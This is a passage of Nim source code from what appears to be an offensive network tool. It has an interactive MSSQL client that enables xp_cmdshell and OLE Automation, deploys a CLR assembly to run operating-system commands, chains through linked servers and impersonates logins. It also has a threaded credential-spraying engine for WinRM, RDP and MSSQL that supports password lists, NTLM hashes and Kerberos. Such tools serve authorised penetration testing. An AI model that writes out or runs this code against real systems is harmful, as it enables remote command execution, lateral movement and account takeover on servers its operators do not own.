  " EXEC @hr = sp_OAMethod @sh, 'Exec', @exec OUT, @run;" &
  " SET @status = 0;" &
  " WHILE @status = 0 BEGIN EXEC @hr = sp_OAGetProperty @exec, 'Status', @status OUT; IF @status = 0 WAITFOR DELAY '00:00:01'; END;" &
  " EXEC @hr = sp_OAGetProperty @exec, 'StdOut', @stdout OUT;" &
  " EXEC @hr = sp_OAGetProperty @exec, 'StdErr', @stderr OUT;" &
  " EXEC @hr = sp_OAMethod @stdout, 'ReadAll', @out OUT;" &
  " EXEC @hr = sp_OAMethod @stderr, 'ReadAll', @err OUT;" &
  " EXEC @hr = sp_OADestroy @stdout; EXEC @hr = sp_OADestroy @stderr; EXEC @hr = sp_OADestroy @exec; EXEC @hr = sp_OADestroy @sh;" &
  " SELECT COALESCE(NULLIF(@out, N''), NULLIF(@err, N''), N'') AS output;" &
  "END"

proc mssqlDangerSql(): string =
  "SELECT CAST(IS_SRVROLEMEMBER('sysadmin') AS int) AS is_sysadmin, " &
  "CAST(SERVERPROPERTY('IsClustered') AS int) AS is_clustered, " &
  "CAST(SERVERPROPERTY('IsIntegratedSecurityOnly') AS int) AS windows_auth_only; " &
  "SELECT name, CAST(value_in_use AS int) AS value_in_use " &
  "FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled','clr strict security','show advanced options') ORDER BY name; " &
  "SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled, is_data_access_enabled FROM sys.servers WHERE is_linked = 1 ORDER BY name; " &
  "SELECT name, CAST(is_trustworthy_on AS int) AS trustworthy_on, CAST(is_db_chaining_on AS int) AS db_chaining_on, SUSER_SNAME(owner_sid) AS owner_name FROM sys.databases ORDER BY name; " &
  "SELECT DISTINCT permission_name, state_desc FROM sys.server_permissions WHERE grantee_principal_id = SUSER_ID() ORDER BY permission_name; " &
  "SELECT DISTINCT permission_name, state_desc FROM sys.database_permissions WHERE grantee_principal_id = DATABASE_PRINCIPAL_ID() ORDER BY permission_name;"

proc mssqlRenderCliResult(r: mssqlclient.MsSqlExecResult): string =
  for m in r.messages:
    if m.text.len > 0:
      let prefix =
        if m.isError:
          red("[!] ")
        else:
          gray("[") & bold("mssql") & gray("] ")
      result.add prefix & m.text.strip() & "\n"
  for rs in r.resultSets:
    if rs.columns.len == 0:
      continue
    var rows = rs.rows
    if rs.columns.len == 1:
      var filtered: seq[seq[string]] = @[]
      for row in rows:
        if row.len == 0 or row[0].strip().len == 0:
          continue
        filtered.add row
      rows = filtered
    if rows.len == 0:
      continue
    var widths: seq[int]
    for col in rs.columns:
      widths.add max(1, col.name.len)
    for row in rows:
      for i, cell in row:
        if i < widths.len:
          widths[i] = max(widths[i], cell.len)
    var header: seq[string]
    var ruler: seq[string]
    for i, col in rs.columns:
      header.add brightCyan(alignLeft(col.name, widths[i]))
      ruler.add gray(repeat('-', widths[i]))
    result.add header.join(gray(" | ")) & "\n"
    result.add ruler.join(gray("-+-")) & "\n"
    for row in rows:
      var parts: seq[string]
      for i, cell in row:
        parts.add alignLeft(cell, widths[i])
      result.add parts.join(gray(" | ")) & "\n"
    result.add dim("(" & $rows.len & " row" & (if rows.len == 1: "" else: "s") & ")\n")
  if result.len == 0:
    if r.rowsAffected > 0:
      result = dim("(" & $r.rowsAffected & " row(s) affected)\n")
    elif r.success:
      result = green("ok") & "\n"
  if not r.success and r.error.len > 0:
    result.add red("[!] ") & r.error & "\n"

proc mssqlCliPrompt(state: MsSqlCliState): string =
  let db = if state.databaseName.len > 0: state.databaseName else: "master"
  var suffix = ""
  if state.impersonatedLogin.len > 0:
    suffix = dim(" as ") & brightGreen(state.impersonatedLogin)
  if state.linkedServer.len > 0:
    gray("[") & bold("mssql") & gray(" ") & brightCyan(db) &
      dim(" via ") & brightYellow(state.linkedServer) & suffix & gray("]> ")
  else:
    gray("[") & bold("mssql") & gray(" ") & brightCyan(db) & suffix & gray("]> ")

proc mssqlCliContinuationPrompt(state: MsSqlCliState): string =
  let db = if state.databaseName.len > 0: state.databaseName else: "master"
  if state.linkedServer.len > 0:
    gray("[") & dim(".... ") & brightCyan(db) &
      dim(" via ") & brightYellow(state.linkedServer) & gray("]> ")
  else:
    gray("[") & dim(".... ") & brightCyan(db) & gray("]> ")

proc mssqlCliHelp() =
  stderr.writeLine gray("[") & bold("mssql") & gray("] ") & brightCyan("commands")
  let items = [
    ("help", "show this help"),
    ("exit | quit", "leave the client"),
    ("whoami", "show login/user/database context"),
    ("serverinfo", "show server/login/database context"),
    ("use <db>", "change database context"),
    ("dbs", "list databases"),
    ("tables [pattern]", "list tables in the current database"),
    ("users", "list database principals"),
    ("links", "list linked servers"),
    ("link <server>", "set linked-server context for subsequent SQL"),
    ("unlink", "clear linked-server context"),
    ("exec-link <srv> <sql>", "run SQL or shell command on a linked server"),
    ("exec-link-chain <a,b> <sql>", "run SQL or shell command through a link chain"),
    ("xp <cmd>", "run xp_cmdshell locally or on current linked server"),
    ("xp-link <srv> <cmd>", "run xp_cmdshell on a specific linked server"),
    ("enable_xp", "enable xp_cmdshell locally"),
    ("ole <cmd>", "run command via OLE (Windows) or xp_cmdshell (Linux)"),
    ("ole-link <srv> <cmd>", "run command via OLE on a specific linked server"),
    ("enable_ole", "enable OLE Automation Procedures (Windows only)"),
    ("clr <cmd>", "run command via CLR assembly"),
    ("clr-link <srv> <cmd>", "run command via CLR on a specific linked server"),
    ("enum-impersonate", "list IMPERSONATE grants and all server principals"),
    ("enum-danger", "audit server config, linked servers, trust settings, permissions"),
    ("impersonate <login>", "execute as a local server login"),
    ("revert", "revert a local EXECUTE AS context"),
    ("source <file.sql>", "load and run a SQL script"),
    ("<sql> \\", "continue SQL on the next line")
  ]
  for item in items:
    stderr.writeLine "  " & padAnsiRight(brightCyan(item[0]), 24) & dim(item[1])
  stderr.writeLine dim("  raw T-SQL runs directly; linked context uses EXEC ('...') AT [server]")

proc mssqlCliNotice(text: string) =
  stderr.writeLine gray("[") & bold("mssql") & gray("] ") & dim(text)

proc mssqlCliError(text: string) =
  stderr.writeLine red("[!] ") & text

proc mssqlBracketIdent(name: string): string =
  "[" & name.replace("]", "]]") & "]"

proc mssqlWrapLinked(server, sql: string): string =
  "EXEC ('" & mssqlEscapeString(sql) & "') AT " & mssqlBracketIdent(server)

proc mssqlWrapLinkedChain(servers: seq[string]; sql: string): string =
  result = sql
  if servers.len == 0:
    return
  for i in countdown(servers.len - 1, 0):
    result = mssqlWrapLinked(servers[i], result)

proc mssqlMaybeWrapLinked(server, sql: string): string =
  if server.len > 0: mssqlWrapLinked(server, sql) else: sql

proc mssqlWrapState(state: MsSqlCliState; inner: string): string =
  var sql = inner
  if state.impersonatedLogin.len > 0:
    sql = "EXECUTE AS LOGIN = N'" & mssqlEscapeString(state.impersonatedLogin) & "'; " & sql & "; REVERT"
  if state.linkedServer.len > 0:
    if state.databaseName.len > 0:
      sql = "USE " & mssqlBracketIdent(state.databaseName) & "; " & sql
    sql = mssqlWrapLinked(state.linkedServer, sql)
  sql

proc mssqlParseLinkedInvocation(raw, verb: string): tuple[target, payload: string] =
  let rest = raw[verb.len .. ^1].strip()
  let sp = rest.find(' ')
  if sp <= 0:
    return ("", "")
  result.target = mssqlStripOuterQuotes(rest[0 ..< sp])
  result.payload = mssqlStripOuterQuotes(rest[sp + 1 .. ^1])

proc mssqlBuildExecLinkSql(payload: string): string =
  var linkedSql = mssqlStripOuterQuotes(payload)
  if linkedSql.len == 0:
    return ""
  if not mssqlLooksLikeSql(linkedSql):
    linkedSql = "EXEC xp_cmdshell '" & mssqlEscapeString(linkedSql) & "'"
  linkedSql

proc mssqlLoadSqlFile(path: string): string =
  try:
    readFile(path)
  except CatchableError as error:
    raise newException(IOError, "cannot read SQL file " & path & ": " & error.msg)

proc mssqlEnsureClrDeployed(session: mssqlclient.MsSqlSession; state: var MsSqlCliState;
                            target: string): bool =
  if target in state.clrDeployedOn:
    return true
  mssqlCliNotice("compiling CLR assembly")
  let (dllHex, compErr) = mssqlCompileClrExec()
  if dllHex.len == 0:
    mssqlCliError(compErr)
    return false
  mssqlCliNotice("deploying CLR assembly to " & (if target.len > 0: target else: "local"))
  for deploySql in mssqlClrDeploySqls(dllHex):
    let dr = mssqlRunOnSession(session, mssqlMaybeWrapLinked(target, deploySql))
    for m in dr.messages:
      if m.text.len > 0:
        if m.isError:
          mssqlCliError(m.text.strip())
        else:
          mssqlCliNotice(m.text.strip())
    if not dr.success:
      mssqlCliError("CLR deploy failed: " & dr.error)
      return false
  state.clrDeployedOn.add target
  mssqlCliNotice("CLR assembly deployed")
  true

proc mssqlRunOnSession(session: mssqlclient.MsSqlSession; sql: string): mssqlclient.MsSqlExecResult =
  try:
    waitFor session.sendSqlBatch(sql)
    let response = waitFor session.readResponse()
    result.host = ""
    result.port = 0
    result.authenticated = session.authenticated
    result.serverVersion = session.serverVersion
    result.resultSets = response.sets
    result.messages = response.messages
    result.rowsAffected = response.rowCount
    result.success = true
    for m in response.messages:
      if m.isError:
        result.success = false
        result.error = m.text
        break
  except CatchableError as error:
    result.success = false
    result.error = error.msg.splitLines()[0]

proc mssqlRefreshCliState(session: mssqlclient.MsSqlSession; state: var MsSqlCliState) =
  let inner = "SELECT CONVERT(nvarchar(256), SYSTEM_USER), CONVERT(nvarchar(256), USER_NAME()), CONVERT(nvarchar(256), DB_NAME())"
  var r = mssqlRunOnSession(session, mssqlWrapState(state, inner))
  if not r.success and state.linkedServer.len > 0 and state.databaseName.len > 0:
    state.databaseName = ""
    r = mssqlRunOnSession(session, mssqlWrapState(state, inner))
  if r.success and r.resultSets.len > 0 and r.resultSets[0].rows.len > 0:
    let row = r.resultSets[0].rows[0]
    if row.len > 0: state.loginName = row[0]
    if row.len > 1: state.dbUser = row[1]
    if row.len > 2: state.databaseName = row[2]

proc mssqlRunClrOneShot(host: string; config: CliConfig; linkedServer, cmd: string): mssqlclient.MsSqlExecResult =
  try:
    let database = if config.mssqlDatabase.len > 0: config.mssqlDatabase else: "master"
    let session = waitFor mssqlclient.openMsSqlSession(host, config.port,
      max(config.timeoutMs, 5000), config.username, config.password, database,
      ntlmHash = config.ntlmHash, domain = config.domain, kerberos = config.kerberos,
      ccache = config.ccachePath, spnOverride = config.mssqlSpnOverride)
    result.authenticated = session.authenticated
    result.serverVersion = session.serverVersion
    if not session.authenticated:
      result.authMessage = "Login7 rejected"
      asyncnet.close(session.socket)
      return
    let (dllHex, compErr) = mssqlCompileClrExec()
    if dllHex.len == 0:
      result.success = false
      result.error = compErr
      asyncnet.close(session.socket)
      return
    for deploySql in mssqlClrDeploySqls(dllHex):
      let wrappedDeploy = if linkedServer.len > 0: mssqlWrapLinked(linkedServer, deploySql) else: deploySql
      let dr = mssqlRunOnSession(session, wrappedDeploy)
      for msg in dr.messages:
        result.messages.add msg
      if not dr.success:
        result.success = false
        result.error = if dr.error.len > 0: dr.error else: "CLR deploy failed"
        asyncnet.close(session.socket)
        return
    let execSql = "SELECT dbo.nimux_clr(N'" & mssqlEscapeString(cmd) & "')"
    let wrappedExec = if linkedServer.len > 0: mssqlWrapLinked(linkedServer, execSql) else: execSql
    result = mssqlRunOnSession(session, wrappedExec)
    result.authenticated = session.authenticated
    result.serverVersion = session.serverVersion
    asyncnet.close(session.socket)
  except CatchableError as error:
    result.success = false
    result.error = error.msg.splitLines()[0]

proc runMsSqlCli(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0:
    raise newException(ValueError, "no targets supplied")
  if targets.len > 1:
    raise newException(ValueError, "--cli requires exactly one target")
  let host = targets[0]
  let database = if config.mssqlDatabase.len > 0: config.mssqlDatabase else: "master"
  let session = waitFor mssqlclient.openMsSqlSession(host, config.port,
    max(config.timeoutMs, 5000), config.username, config.password, database,
    ntlmHash = config.ntlmHash, domain = config.domain, kerberos = config.kerberos,
    ccache = config.ccachePath, spnOverride = config.mssqlSpnOverride)
  defer:
    try: asyncnet.close(session.socket)
    except CatchableError: discard
  if not session.authenticated:
    raise newException(IOError, "MSSQL authentication failed")

  let principal =
    if config.domain.len > 0: config.domain & "\\" & config.username
    else: config.username
  var state = MsSqlCliState(linkedServer: config.mssqlLinkServer)
  mssqlRefreshCliState(session, state)
  stderr.writeLine gray("[") & bold("mssql") & gray("] ") &
    brightCyan(host & ":" & $config.port) & "  " & dim(principal)
  if session.serverVersion.len > 0:
    stderr.writeLine dim(session.serverVersion)
  stderr.writeLine dim("type 'exit' to quit; 'help' for client commands")
  initReadline()

  while true:
    var line = ""
    try:
      line = lineread.readlineWithHistory(mssqlCliPrompt(state))
    except EOFError:
      stderr.writeLine ""
      break
    var raw = line.strip()
    if raw.endsWith("\\"):
      var parts: seq[string] = @[raw[0 ..< raw.len - 1].strip(leading = false)]
      while true:
        var nextLine = ""
        try:
          nextLine = lineread.readlineWithHistory(mssqlCliContinuationPrompt(state))
        except EOFError:
          stderr.writeLine ""
          break
        let nextRaw = nextLine.strip(leading = false)
        if nextRaw.endsWith("\\"):
          parts.add nextRaw[0 ..< nextRaw.len - 1].strip(leading = false)
          continue
        parts.add nextRaw
        break
      raw = parts.join("\n").strip()
    if raw.len == 0:
      continue
    let lower = raw.toLowerAscii()
    if lower in ["exit", "quit"]:
      break
    if lower == "help":
      mssqlCliHelp()
      continue
    if lower == "unlink":
      state.linkedServer = ""
      state.impersonatedLogin = ""
      mssqlRefreshCliState(session, state)
      continue
    if lower == "whoami":
      if state.linkedServer.len > 0 or state.impersonatedLogin.len > 0:
        let inner = "SELECT SYSTEM_USER AS login, USER_NAME() AS [user], DB_NAME() AS db, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin"
        let r = mssqlRunOnSession(session, mssqlWrapState(state, inner))
        let text = mssqlRenderCliResult(r).strip()
        if text.len > 0: stdout.writeLine text
      else:
        mssqlRefreshCliState(session, state)
        var line = dim("login ") & bold(state.loginName) &
          dim("  user ") & brightCyan(state.dbUser) &
          dim("  db ") & brightCyan(state.databaseName)
        mssqlCliNotice(line)
      continue

    var sql = ""
    if lower == "dbs" or lower == "databases":
      sql = mssqlWrapState(state, "SELECT name FROM sys.databases ORDER BY name")
    elif lower == "serverinfo":
      sql = mssqlWrapState(state, "SELECT @@SERVERNAME AS server_name, SUBSTRING(@@VERSION,1,100) AS version, SYSTEM_USER AS login_name, USER_NAME() AS db_user, DB_NAME() AS database_name")
    elif lower == "users":
      sql = mssqlWrapState(state, "SELECT name, type_desc AS type FROM sys.database_principals WHERE principal_id > 4 ORDER BY name")
    elif lower.startsWith("tables"):
      let pattern =
        if raw.len > 6: raw[6 .. ^1].strip()
        else: ""
      if pattern.len > 0:
        sql = mssqlWrapState(state, "SELECT TABLE_SCHEMA AS schema_name, TABLE_NAME AS table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND (TABLE_SCHEMA LIKE '" &
          mssqlEscapeString(pattern) & "' OR TABLE_NAME LIKE '" & mssqlEscapeString(pattern) &
          "') ORDER BY TABLE_SCHEMA, TABLE_NAME")
      else:
        sql = mssqlWrapState(state, "SELECT TABLE_SCHEMA AS schema_name, TABLE_NAME AS table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' ORDER BY TABLE_SCHEMA, TABLE_NAME")
    elif lower == "links":
      sql = mssqlWrapState(state, "SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1 ORDER BY name")
    elif lower == "enum-impersonate":
      sql = mssqlWrapState(state, "SELECT DISTINCT b.name AS grantee, p.permission_name, p.state_desc FROM sys.server_permissions p JOIN sys.server_principals b ON p.grantee_principal_id = b.principal_id WHERE p.permission_name = 'IMPERSONATE' ORDER BY b.name; " &
        "SELECT name, type_desc, default_database_name FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name;")
    elif lower == "enum-danger":
      sql = mssqlWrapState(state, mssqlDangerSql())
    elif lower == "enable_xp":
      sql = mssqlWrapState(state, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
    elif lower.startsWith("use "):
      let db = raw[4 .. ^1].strip()
      if db.len == 0:
        mssqlCliError("use requires a database name")
        continue
      if state.linkedServer.len > 0:
        state.databaseName = db
      sql = mssqlWrapState(state, "USE " & mssqlBracketIdent(db))
    elif lower.startsWith("link "):
      let linked = mssqlStripOuterQuotes(raw[5 .. ^1])
      if linked.len == 0:
        mssqlCliError("link requires a linked-server name")
        continue
      state.linkedServer = linked
      state.databaseName = ""
      mssqlRefreshCliState(session, state)
      continue
    elif lower.startsWith("exec-link "):
      let (linked, payload) = mssqlParseLinkedInvocation(raw, "exec-link ")
      if linked.len == 0:
        mssqlCliError("exec-link requires <server> <sql>")
        continue
      let linkedSql = mssqlBuildExecLinkSql(payload)
      if linkedSql.len == 0:
        mssqlCliError("exec-link requires a non-empty SQL statement or command")
        continue
      sql = mssqlWrapLinked(linked, linkedSql)
    elif lower.startsWith("exec-link-chain "):
      let (targets, payload) = mssqlParseLinkedInvocation(raw, "exec-link-chain ")
      let servers = targets.split(',').mapIt(it.strip()).filterIt(it.len > 0)
      if servers.len == 0:
        mssqlCliError("exec-link-chain requires <a,b,...> <sql>")
        continue
      let linkedSql = mssqlBuildExecLinkSql(payload)
      if linkedSql.len == 0:
        mssqlCliError("exec-link-chain requires a non-empty SQL statement or command")
        continue
      sql = mssqlWrapLinkedChain(servers, linkedSql)
    elif lower.startsWith("xp "):
      let cmd = raw[3 .. ^1].strip()
      if cmd.len == 0:
        mssqlCliError("xp requires a command")
        continue
      sql = mssqlWrapState(state, "EXEC xp_cmdshell '" & mssqlEscapeString(cmd) & "'")
    elif lower.startsWith("xp-link "):
      let (linked, cmd) = mssqlParseLinkedInvocation(raw, "xp-link ")
      if linked.len == 0 or cmd.len == 0:
        mssqlCliError("xp-link requires <server> <cmd>")
        continue
      sql = mssqlWrapLinked(linked, "EXEC xp_cmdshell '" & mssqlEscapeString(cmd) & "'")
    elif lower == "enable_ole":
      sql = mssqlWrapState(state, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;")
    elif lower.startsWith("ole "):
      let cmd = raw[4 .. ^1].strip()
      if cmd.len == 0:
        mssqlCliError("ole requires a command")
        continue
      sql = mssqlWrapState(state, mssqlOleSql(cmd))
    elif lower.startsWith("ole-link "):
      let (linked, cmd) = mssqlParseLinkedInvocation(raw, "ole-link ")
      if linked.len == 0 or cmd.len == 0:
        mssqlCliError("ole-link requires <server> <cmd>")
        continue
      sql = mssqlWrapLinked(linked, mssqlOleSql(cmd))
    elif lower.startsWith("clr "):
      let cmd = raw[4 .. ^1].strip()
      if cmd.len == 0:
        mssqlCliError("clr requires a command")
        continue
      let target = if state.linkedServer.len > 0: state.linkedServer else: ""
      if not mssqlEnsureClrDeployed(session, state, target):
        continue
      let execSql = "SELECT dbo.nimux_clr(N'" & mssqlEscapeString(cmd) & "')"
      sql = mssqlMaybeWrapLinked(target, execSql)
    elif lower.startsWith("clr-link "):
      let (linked, cmd) = mssqlParseLinkedInvocation(raw, "clr-link ")
      if linked.len == 0 or cmd.len == 0:
        mssqlCliError("clr-link requires <server> <cmd>")
        continue
      if not mssqlEnsureClrDeployed(session, state, linked):
        continue
      sql = mssqlWrapLinked(linked, "SELECT dbo.nimux_clr(N'" & mssqlEscapeString(cmd) & "')")
    elif lower.startsWith("impersonate "):
      let login = mssqlStripOuterQuotes(raw["impersonate ".len .. ^1])
      if login.len == 0:
        mssqlCliError("impersonate requires a login name")
        continue
      if state.linkedServer.len > 0:
        state.impersonatedLogin = login
        let inner = "EXECUTE AS LOGIN = N'" & mssqlEscapeString(login) & "'; SELECT SYSTEM_USER AS login, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin"
        sql = mssqlWrapLinked(state.linkedServer, inner)
      else:
        sql = "EXECUTE AS LOGIN = N'" & mssqlEscapeString(login) & "'"
    elif lower == "revert":
      if state.linkedServer.len > 0:
        state.impersonatedLogin = ""
        let inner = "REVERT; SELECT SYSTEM_USER AS login, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin"
        sql = mssqlWrapLinked(state.linkedServer, inner)
      else:
        sql = "REVERT"
    elif lower.startsWith("source "):
      let path = mssqlStripOuterQuotes(raw[7 .. ^1])
      if path.len == 0:
        mssqlCliError("source requires a file path")
        continue
      try:
        sql = mssqlWrapState(state, mssqlLoadSqlFile(path))
      except IOError as error:
        mssqlCliError(error.msg)
        continue
    else:
      sql = mssqlWrapState(state, raw)

    let r = mssqlRunOnSession(session, sql)
    let text = mssqlRenderCliResult(r).strip()
    if text.len > 0:
      stdout.writeLine text
    if lower.startsWith("use ") or lower.startsWith("impersonate ") or lower == "revert":
      mssqlRefreshCliState(session, state)
    elif lower == "enable_xp":
      discard
    else:
      mssqlRefreshCliState(session, state)

const ProtocolThreadJsonMax = 65536

type ProtocolThreadJob = object
  protocol: cstring
  host: cstring
  username: cstring
  password: cstring
  ntlmHash: cstring
  domain: cstring
  winRmPath: cstring
  port: int
  timeoutMs: int
  retries: int
  useSsl: bool
  kerberos: bool
  winRmProbeChecked: bool
  rdpProtocols: uint32
  msSqlEncryption: int
  json: array[ProtocolThreadJsonMax, char]

proc sharedCString(value: string): cstring =
  result = cast[cstring](allocShared0(value.len + 1))
  if value.len > 0:
    copyMem(result, unsafeAddr value[0], value.len)

proc freeSharedCString(value: cstring) =
  if value != nil:
    deallocShared(cast[pointer](value))

proc cstrValue(value: cstring): string =
  if value == nil: "" else: $value

proc setThreadJson(job: ptr ProtocolThreadJob; text: string) =
  let n = min(text.len, ProtocolThreadJsonMax - 1)
  for i in 0 ..< n:
    job.json[i] = text[i]
  job.json[n] = '\0'

proc threadJson(job: ptr ProtocolThreadJob): string =
  var i = 0
  while i < ProtocolThreadJsonMax and job.json[i] != '\0':
    result.add job.json[i]
    inc i

proc protocolProbeThread(job: ptr ProtocolThreadJob) {.thread.} =
  try:
    var cfg = CliConfig(
      protocol: cstrValue(job.protocol),
      port: job.port,
      timeoutMs: job.timeoutMs,
      username: cstrValue(job.username),
      password: cstrValue(job.password),
      ntlmHash: cstrValue(job.ntlmHash),
      domain: cstrValue(job.domain),
      winRmPath: cstrValue(job.winRmPath),
      winRmProbeChecked: job.winRmProbeChecked,
      retries: job.retries,
      useSsl: job.useSsl,
      kerberos: job.kerberos,
      rdpProtocols: job.rdpProtocols,
      msSqlEncryption: job.msSqlEncryption)
    var node: JsonNode
    {.cast(gcsafe).}:
      node = waitFor protocolProbeOne(cstrValue(job.host), cfg)
    setThreadJson(job, $node)
  except CatchableError as error:
    let node = %*{
      "protocol": cstrValue(job.protocol),
      "host": cstrValue(job.host),
      "port": job.port,
      "authenticated": false,
      "username": cstrValue(job.username),
      "auth_domain": cstrValue(job.domain),
      "message": error.msg.splitLines()[0]
    }
    setThreadJson(job, $node)

proc winRmPrefilterThread(job: ptr ProtocolThreadJob) {.thread.} =
  try:
    var probe: winrmclient.WinRmProbe
    {.cast(gcsafe).}:
      probe = winrmclient.probeWinRmSync(cstrValue(job.host), job.port,
        job.timeoutMs, cstrValue(job.winRmPath))
    let node = %*{
      "protocol": "winrm",
      "host": probe.host,
      "port": probe.port,
      "reachable": probe.reachable,
      "speaks_winrm": probe.speaksWinRm,
      "status_code": probe.statusCode,
      "message": probe.message
    }
    setThreadJson(job, $node)
  except CatchableError as error:
    let node = %*{
      "protocol": "winrm",
      "host": cstrValue(job.host),
      "port": job.port,
      "reachable": false,
      "speaks_winrm": false,
      "message": error.msg.splitLines()[0]
    }
    setThreadJson(job, $node)

proc runProtocol(config: CliConfig) =
  var config = config
  var targetList = parseTargets(config.targets)
  if targetList.len == 0:
    raise newException(ValueError, "no targets supplied")

  let winRmHasCreds =
    (config.username.len > 0 or config.usernames.len > 0) and
    (config.password.len > 0 or config.ntlmHash.len > 0 or
     config.passwords.len > 0)
  if config.protocol == "winrm" and winRmHasCreds and targetList.len > 1 and
      config.retries == 0:
    config.retries = 1
  if config.lockoutAware:
    config.concurrency = 1
    if config.maxAttemptsPerUser <= 0:
      config.maxAttemptsPerUser = 1

  var winRmPrefilterResults: seq[JsonNode]
  if config.protocol == "winrm" and config.remoteCommand.len == 0 and
      not winRmHasCreds and
      (targetList.len > 1 or config.usernames.len > 0 or
       config.passwords.len > 0):
    proc prefilterWinRmHosts(): seq[string] =
      let batchSize = max(1, config.concurrency)
      var offset = 0
      while offset < targetList.len:
        let last = min(targetList.len, offset + batchSize)
        var threads = newSeq[Thread[ptr ProtocolThreadJob]](last - offset)
        var jobs: seq[ptr ProtocolThreadJob]
        for i in offset ..< last:
          let job = cast[ptr ProtocolThreadJob](allocShared0(sizeof(ProtocolThreadJob)))
          job.protocol = sharedCString("winrm-prefilter")
          job.host = sharedCString(targetList[i])
          job.winRmPath = sharedCString(config.winRmPath)
          job.port = config.port
          job.timeoutMs = config.timeoutMs
          jobs.add job
          createThread(threads[i - offset], winRmPrefilterThread, job)
        for thread in threads.mitems:
          joinThread(thread)
        for job in jobs:
          try:
            let node = parseJson(threadJson(job))
            if node{"reachable"}.getBool():
              result.add node{"host"}.getStr()
            else:
              winRmPrefilterResults.add node
          except JsonParsingError:
            discard
          freeSharedCString(job.protocol)
          freeSharedCString(job.host)
          freeSharedCString(job.winRmPath)
          deallocShared(cast[pointer](job))
        offset = last

    targetList = prefilterWinRmHosts()
    config.winRmProbeChecked = true
    if targetList.len == 0:
      for node in winRmPrefilterResults:
        if config.successOnly and not node{"authenticated"}.getBool():
          continue
        if config.logFile.len > 0:
          var f = open(config.logFile, fmAppend)
          try:
            f.writeLine($node)
          finally:
            f.close()
        if config.jsonOutput:
          echo $node
        else:
          echo renderProtocolLine(node)
      return

  type WorkItem = tuple[host: string; username: string; password: string]
  var workList: seq[WorkItem]
  let userList = if config.usernames.len > 0: config.usernames
                 elif config.username.len > 0: @[config.username]
                 else: @[""]
  let passList = if config.passwords.len > 0: config.passwords
                 elif config.password.len > 0: @[config.password]
                 else: @[""]
  for host in targetList:
    for u in userList:
      var attemptsForUser = 0
      for p in passList:
        if config.maxAttemptsPerUser > 0 and attemptsForUser >= config.maxAttemptsPerUser:
          continue
        workList.add (host, u, p)
        inc attemptsForUser

  proc emitProtocolNode(node: JsonNode) =
    if config.successOnly and not node{"authenticated"}.getBool():
      return
    if config.logFile.len > 0:
      var f = open(config.logFile, fmAppend)
      try:
        f.writeLine($node)
      finally:
        f.close()
    if config.jsonOutput:
      echo $node
    else:
      echo renderProtocolLine(node)

  proc runThreaded(): seq[JsonNode] =
    let streamWinRmCreds = config.protocol == "winrm" and winRmHasCreds and targetList.len > 1
    let streamResults = streamWinRmCreds or config.successOnly
    let batchSize =
      if streamWinRmCreds: max(1, min(config.concurrency, 2))
      else: max(1, config.concurrency)
    var offset = 0
    while offset < workList.len:
      let last = min(workList.len, offset + batchSize)
      var threads = newSeq[Thread[ptr ProtocolThreadJob]](last - offset)
      var jobs: seq[ptr ProtocolThreadJob]
      for i in offset ..< last:
        let item = workList[i]
        let job = cast[ptr ProtocolThreadJob](allocShared0(sizeof(ProtocolThreadJob)))
        job.protocol = sharedCString(config.protocol)
        job.host = sharedCString(item.host)
        job.username = sharedCString(item.username)
        job.password = sharedCString(item.password)
        job.ntlmHash = sharedCString(config.ntlmHash)
        job.domain = sharedCString(config.domain)
        job.winRmPath = sharedCString(config.winRmPath)
        job.port = config.port
        job.timeoutMs = config.timeoutMs
        job.retries = config.retries
        job.useSsl = config.useSsl
        job.kerberos = config.kerberos
        job.winRmProbeChecked = config.winRmProbeChecked
        job.rdpProtocols = config.rdpProtocols
        job.msSqlEncryption = config.msSqlEncryption
        jobs.add job
        createThread(threads[i - offset], protocolProbeThread, job)
      for thread in threads.mitems:
        joinThread(thread)
      for job in jobs:
        let username = cstrValue(job.username)
        let password = cstrValue(job.password)
        var node: JsonNode
        try:
          node = parseJson(threadJson(job))
        except JsonParsingError:
          node = %*{
            "protocol": cstrValue(job.protocol),
            "host": cstrValue(job.host),
            "port": job.port,
            "authenticated": false,
            "username": username,
            "auth_domain": cstrValue(job.domain),
            "message": "thread result JSON parse failed"
          }
        if (config.usernames.len > 0 or config.passwords.len > 0) and
            username.len > 0 and password.len > 0 and node{"authenticated"}.getBool():
          node["password"] = %password
          node["credential"] = %(username & ":" & password)
        if streamResults:
          emitProtocolNode(node)
        else:
          result.add node
        freeSharedCString(job.protocol)
        freeSharedCString(job.host)
        freeSharedCString(job.username)
        freeSharedCString(job.password)
        freeSharedCString(job.ntlmHash)
        freeSharedCString(job.domain)
        freeSharedCString(job.winRmPath)
        deallocShared(cast[pointer](job))
      offset = last
      if config.sprayDelayMs > 0 and offset < workList.len:
        sleep(config.sprayDelayMs)

  proc runAll(): Future[seq[JsonNode]] {.async.} =
    var nextIndex = 0

    proc worker(): Future[seq[JsonNode]] {.async.} =
      while true:
        if nextIndex >= workList.len:
          break
        let current = nextIndex
        inc nextIndex
        let item = workList[current]
        if config.sprayDelayMs > 0 and current > 0:
          await sleepAsync(config.sprayDelayMs)
        var cfg = config
        cfg.username = item.username
        cfg.password = item.password
        var node = await protocolProbeOne(item.host, cfg)
        if (config.usernames.len > 0 or config.passwords.len > 0) and
            item.username.len > 0 and item.password.len > 0 and
            node{"authenticated"}.getBool():
          if node{"password"}.getStr().len == 0:
            node["password"] = %item.password
          if node{"credential"}.getStr().len == 0:
            node["credential"] = %(item.username & ":" & item.password)
        result.add node

    var workers: seq[Future[seq[JsonNode]]] = @[]
    for _ in 0 ..< min(config.concurrency, workList.len):
      workers.add worker()
    for future in workers:
      let workerResults = await future
      for item in workerResults:
        result.add item

  let results =
    if workList.len > 1:
      runThreaded()
    else:
      waitFor runAll()

